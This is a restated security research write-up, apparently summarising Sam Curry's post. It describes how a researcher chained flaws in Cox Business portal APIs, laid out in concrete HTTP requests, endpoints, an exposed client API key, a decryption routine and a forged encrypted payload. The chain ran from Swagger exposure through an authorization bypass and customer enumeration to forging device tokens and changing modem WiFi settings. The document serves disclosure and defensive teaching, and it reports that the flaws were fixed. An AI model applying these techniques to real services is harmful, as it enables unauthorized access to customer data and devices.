# Hacking Millions of Modems: Cox Business API Authorization Bypass

## Overview

This research demonstrates how multiple security weaknesses in the Cox Business customer management platform could be chained together to gain unauthorized access to customer accounts and network devices.

The researcher started with no Cox Business account and eventually discovered:

* Exposed Swagger API documentation
* Authorization bypass vulnerabilities
* Customer account enumeration
* Access to customer equipment information
* Ability to retrieve modem MAC addresses
* Ability to modify modem settings remotely
* Potential path to compromise millions of devices

The issue was responsibly disclosed and fixed by Cox.

---

# Initial Reconnaissance

The investigation began by examining the Cox Business portal.

The login page loaded a JavaScript file:

```javascript
main.36624ed36fb0ff5b.js
```

After beautifying the JavaScript, hundreds of API routes were identified.

Examples:

```text
/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
```

Most APIs shared the same base path:

```text
/api/cbma/
```

This suggested a backend service handling most business functionality.

---

# Discovering a Reverse Proxy

To understand how requests were routed, two test requests were sent.

## Request 1

```http
GET /api/anything_else/example HTTP/1.1
Host: myaccount-business.cox.com
```

Response:

```http
HTTP/1.1 301 Moved Permanently

Location: https://myaccount-business.cox.com/cbma/api/anything_else/example
```

---

## Request 2

```http
GET /api/cbma/example HTTP/1.1
Host: myaccount-business.cox.com
```

Response:

```http
HTTP/1.1 500 Internal Server Error
Server: nginx
```

### Observation

Different responses suggested:

* Normal frontend handled regular routes.
* `/api/cbma/` was being reverse proxied to a backend service.

---

# Intercepting Registration Requests

A registration request was captured.

```http
POST /api/cbma/userauthorization/services/profile/validate/v1/email HTTP/1.1

Host: myaccount-business.cox.com
Clientid: cbmauser
Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13
Cb_session: unauthenticateduser
Authorization: Bearer undefined

{"email":"test@example.com"}
```

Response:

```json
{
  "message": "Success",
  "id": "test@example.com"
}
```

Interesting headers:

```text
Clientid
Apikey
Cb_session
Authorization
```

These indicated a custom authentication architecture.

---

# Identifying Spring Boot

Changing the POST request to GET generated:

```http
GET /api/cbma/userauthorization/services/profile/validate/v1/email
```

Response:

```json
{
  "timestamp": "2024-04-12T08:57:14.384+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "path": "/services/profile/validate/v1/email"
}
```

This format is commonly produced by Spring Boot.

### Conclusion

Backend technology:

```text
Spring Boot
```

---

# Searching for Actuators

Several common Spring Actuator locations were tested.

```text
/api/cbma/actuator/
/api/cbma/userauthorization/actuator/
/api/cbma/userauthorization/services/actuator/
```

Results:

```text
❌ Not Found
```

No exposed actuator endpoints were discovered.

---

# Searching for Swagger Documentation

Swagger paths were tested.

Eventually:

```text
GET /api/cbma/userauthorization/swagger-ui/index.html
```

returned:

```text
200 OK
```

A Swagger UI existed.

However the page appeared empty.

---

# Debugging Swagger

Browser developer tools revealed an infinite redirect loop.

Example:

```http
GET /api/cbma/ticket/services/swagger-ui/swagger-initializer.js
```

Redirected to:

```text
/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js
```

Then:

```text
/cbma/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js
```

and continued forever.

---

# Bypassing Static Resource Routing

The researcher tested appending bytes from:

```text
%00 → %FF
```

using Burp Intruder.

Success occurred using:

```text
%2f
```

Request:

```http
GET /api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f
```

Response:

```http
HTTP/2 200 OK
Content-Type: application/javascript
```

Swagger resources loaded successfully.

---

# Enumerating APIs

After loading Swagger documentation, approximately 700 endpoints became visible.

API Groups:

```text
account                (115 routes)
voiceutilities         (73 routes)
user                   (70 routes)
datainternetgateway    (57 routes)
accountequipment       (55 routes)
billing                (53 routes)
ticket                 (52 routes)
profile                (47 routes)
voicecallmanagement    (46 routes)
voicemail              (37 routes)
voiceusermanagement    (30 routes)
userauthorization      (24 routes)
csr                    (16 routes)
voiceprofile           (14 routes)
```

Most interesting:

```text
account
accountequipment
datainternetgateway
```

because they interacted with customer hardware.

---

# Authorization Bypass Discovery

The endpoint:

```http
GET /api/cbma/profile/services/profile/profilesearch/
```

returned:

```json
{
  "message": "Success",
  "profile": {
    "numberofRecords": "0 hits",
    "searchList": []
  }
}
```

Adding search terms sometimes returned:

```json
{
  "message": "Authorization Error-Invalid User Token"
}
```

but repeatedly replaying requests occasionally returned valid data.

This indicated an intermittent authorization bypass.

---

# Enumerating Customers

Searching for:

```text
cox
```

returned:

```json
{
  "message": "Success",
  "profile": {
    "numberofRecords": "10000+ hits",
    "searchList": [
      {
        "value": "COX REDACTED",
        "profileGuid": "..."
      }
    ]
  }
}
```

Searching:

```text
fbi
```

returned FBI-related customer records.

This proved unauthorized customer enumeration.

---

# Retrieving Device Information

Endpoint:

```text
/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=
```

Request:

```http
GET /api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90
```

Response:

```json
{
  "message": "Success",
  "ipv4": "98.165.155.8"
}
```

The backend could directly query customer equipment.

---

# Retrieving Equipment Lists

Endpoint:

```http
GET /api/cbma/accountequipment/services/accountequipment/v1/equipments/{accountId}
```

Response included:

```json
{
  "equipmentType": "Nokia ONT",
  "macAddress": "f8:0c:58:bb:cb:92"
}
```

Additional information:

* MAC Address
* Serial Number
* Device Model
* Equipment Category
* Port Information

This provided all information needed to target hardware.

---

# Accessing Customer Accounts

The following endpoint accepted an email address.

```http
GET /api/cbma/user/services/user/admin@cox.net
```

Response:

```json
{
  "email": "admin@cox.net",
  "firstName": "...",
  "lastName": "...",
  "primaryPhone": "...",
  "profileOwner": true
}
```

This exposed customer information.

The researcher also verified that account update APIs worked.

This demonstrated:

```text
Read Access
+
Write Access
```

to customer accounts.

---

# Investigating encryptedValue

Many device-modification APIs required:

```text
encryptedValue
```

parameter.

JavaScript analysis revealed:

```javascript
encryptWithSaltandPadding()
decryptWithSaltandPadding()
```

functions.

```javascript
encryptWithSaltandPadding(D) {
    const k = n.AES.encrypt(D, this.getKey(), {
        iv: n.enc.Hex.parse(s.IV)
    }).ciphertext.toString(n.enc.Base64);

    return btoa(s.IV + "::" + s.qs + "::" + k)
}
```

---

# Decrypting Values

The PIN encryption function used the same routine.

Decrypting an encrypted PIN:

```javascript
t.cbHelper.decryptWithSaltandPadding("...")
```

returned:

```text
8042
```

The cryptographic secret was exposed client-side.

---

# Recovering Device Information

Decrypting a device value revealed:

```text
541051614702;DTC4131;333415591;1;f4:c1:14:70:4d:ac;Internet
```

Fields:

```text
541051614702 = Account ID
DTC4131 = Device Name
333415591 = Device ID
1 = Unknown
f4:c1:14:70:4d:ac = MAC Address
Internet = Label
```

---

# Testing Validation Logic

A forged value was generated:

```text
123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING
```

Encrypted using:

```javascript
encryptWithSaltandPadding()
```

The API accepted it.

### Result

Only the MAC address mattered.

Account ID validation was not enforced.

---

# Modifying Router Settings

A WiFi configuration request was sent.

```http
POST /api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings
```

Payload:

```json
{
  "wifiSettings": {
    "customerWifiSsid24": "Curry"
  },
  "additionalProperties": {
    "customerWifiSsid24": [
      "Curry"
    ]
  },
  "encryptedValue": "..."
}
```

Response:

```json
{
  "message": "Success"
}
```

Immediately afterward:

```text
Internet disconnected
Modem rebooted
SSID changed to Curry
```

The configuration change succeeded.

---

# Complete Attack Chain

## Step 1

Search customer:

```text
Customer Search API
```

↓

## Step 2

Retrieve Profile GUID

↓

## Step 3

Retrieve Account Information

↓

## Step 4

Retrieve Device Inventory

↓

## Step 5

Extract MAC Addresses

↓

## Step 6

Generate encryptedValue

↓

## Step 7

Send Device Management Requests

↓

## Step 8

Modify Router Configuration

↓

## Step 9

Potential Device Compromise

---

# Impact

An attacker could potentially:

* Enumerate customers
* Access customer PII
* Retrieve account details
* Retrieve device information
* Obtain MAC addresses
* Change WiFi settings
* Reboot devices
* Modify network configuration
* Potentially achieve full device control

Affected population:

```text
Millions of Cox customers
```

---

# Root Causes

1. Exposed Swagger Documentation
2. Authorization Bypass
3. Broken Access Control
4. Client-side Cryptographic Secret Exposure
5. Missing Ownership Validation
6. Excessive API Permissions

---

# Responsible Disclosure

The researcher reported the issues through Cox's responsible disclosure program.

Timeline:

```text
Report Submitted
↓
API endpoints removed within ~6 hours
↓
Authorization issues fixed
↓
Vulnerabilities no longer reproducible the following day
```

---

# Key Security Lessons

* Never trust client-side encryption.
* Swagger documentation should not be publicly accessible.
* Every API request must validate ownership.
* MAC addresses should never act as authorization tokens.
* Administrative APIs require strict access controls.
* Security testing must include replay and race-condition scenarios.

---

# Conclusion

This case demonstrates how several individually small weaknesses—Swagger exposure, authorization flaws, weak validation, and leaked cryptographic functionality—can be chained together into a critical compromise.

The final result allowed unauthorized users to discover customers, access account information, retrieve device details, and remotely modify modem settings through backend APIs.

It is a strong example of Broken Access Control becoming a full infrastructure-level security incident.


refrence:https://samcurry.net/hacking-millions-of-modems#hacking-millions-of-modems
